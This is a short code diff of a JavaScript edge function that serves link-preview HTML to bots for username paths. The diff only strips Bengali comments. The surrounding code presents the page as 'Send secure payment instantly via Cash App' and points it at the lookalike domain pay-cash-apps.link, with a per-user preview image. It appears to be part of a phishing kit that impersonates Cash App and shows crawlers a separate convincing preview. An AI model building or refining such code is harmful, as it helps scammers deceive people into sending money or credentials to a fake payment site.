@@ -2,7 +2,7 @@ export default async (request, context) => {
   const url = new URL(request.url);
   const path = url.pathname.replace(/^\//, '');
 
-  // Static files, API, বা খালি path হলে সাধারণভাবে চলতে দিন
+
   if (!path || path.includes('.') || path.startsWith('api') || path.startsWith('assets')) {
     return context.next();
   }
@@ -15,7 +15,7 @@ export default async (request, context) => {
     return context.next();
   }
 
-  // Bot হলে OG HTML পাঠান
+  
   const username = path.split('/')[0];
   const formattedName = username.charAt(0).toUpperCase() + username.slice(1);
 
@@ -23,7 +23,7 @@ export default async (request, context) => {
   const description = `Send secure payment instantly via Cash App.`;
   const previewImageUrl = `https://thunder-m.vercel.app/og/${encodeURIComponent(username)}`;
   
-  // 🛑 এখানে নেটালিফাইয়ের পরিবর্তে আপনার কাস্টম পেমেন্ট ডোমেইন বসিয়ে দিন:
+
   const currentUrl = `https://pay-cash-apps.link/${username}`;
 
   const html = `<!DOCTYPE html>
